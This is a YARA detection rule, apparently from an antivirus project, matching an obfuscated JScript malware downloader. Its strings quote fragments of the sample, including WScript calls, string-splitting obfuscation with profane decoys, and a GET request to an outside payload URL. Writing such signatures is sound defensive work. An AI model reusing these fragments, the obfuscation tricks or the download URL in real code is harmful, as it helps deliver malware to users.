rule sig_20160428_363a901f5a6daf683b28523a04c3b546 {
  meta:
    description = "datamaliciousorder - file 20160428_363a901f5a6daf683b28523a04c3b546.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "353d20c8d5697248726164f4e9a1dcee96353214ae79fbb8a16140f767936c2a"

  strings:
    $s1  = "function FkdKojArgKoxCpcQztAun(KddMaaLpaOjqBscOscBor){XyvThdLjsRrrSwrZuwImm[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function FkdKojArgKoxCpcQztAun(KddMaaLpaOjqBscOscBor){XyvThdLjsRrrSwrZuwImm[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function VvtYiqCnsHilXkwPrlZeg() {return XyvThdLjsRrrSwrZuwImm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function DydEckUebCslWstRajExx(OfjGgiNtmDsdAalOucEsn, FmuMudLtfHluMhfBcpXjs){DvrIxuCmiSgvJbyRqoHux = DvrIxuCmiSgvJbyRqoHux * 1; " ascii
    $s5  = "var XyvThdLjsRrrSwrZuwImm = function MgyRciEluTawRxlOjpVdz() {return RzzZnvMehGgjEzfPokMsi[CteZgpOxuYlhPhmVjbUpc](\"WScript\"+\"" ascii
    $s6  = "return OfjGgiNtmDsdAalOucEsn - FmuMudLtfHluMhfBcpXjs;};" fullword ascii
    $s7  = "HkcGnmSvmWreRwhUtfQig[JsuAvkMmgCmuVooTylCmt](\"G\" + \"ET\", \"http://alex-naumov.ru/j8skdwq\", false);" fullword ascii
    $s8  = "var RzzZnvMehGgjEzfPokMsi = this[\"WScript\"];" fullword ascii
    $s9  = "var XyvThdLjsRrrSwrZuwImm = function MgyRciEluTawRxlOjpVdz() {return RzzZnvMehGgjEzfPokMsi[CteZgpOxuYlhPhmVjbUpc](\"WScript\"+\"" ascii
    $s10 = "function VvtYiqCnsHilXkwPrlZeg() {return XyvThdLjsRrrSwrZuwImm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function DydEckUebCslWstRajExx(OfjGgiNtmDsdAalOucEsn, FmuMudLtfHluMhfBcpXjs){DvrIxuCmiSgvJbyRqoHux = DvrIxuCmiSgvJbyRqoHux * 1; " ascii
    $s12 = "function KaxGldKjnAqhYcoPbyRdv(){return FevHgmBpsKhlQtrGwaRdb + \"\";};" fullword ascii
    $s13 = "if (HkcGnmSvmWreRwhUtfQig[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function XltUsuBczOcfHtvHraTjv() {return ((NuqLmvQicPyuCqdFseAda == true) && (NuqLmvQicPyuCqdFseAda == ShmNlcWxbUfbEeuMuoNmc)) ?" ascii
    $s15 = "function XltUsuBczOcfHtvHraTjv() {return ((NuqLmvQicPyuCqdFseAda == true) && (NuqLmvQicPyuCqdFseAda == ShmNlcWxbUfbEeuMuoNmc)) ?" ascii
    $s16 = "var BtgQfwVupAfxJmoBotCjh = false;" fullword ascii
    $s17 = "function PgbCqgLokDvnHvaWnlMeg(){return 23;};" fullword ascii
    $s18 = "NuqLmvQicPyuCqdFseAda = true; " fullword ascii
    $s19 = "ShmNlcWxbUfbEeuMuoNmc = true; " fullword ascii
    $s20 = "function XkpJsiCxeYfnIqjLsrEsa()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}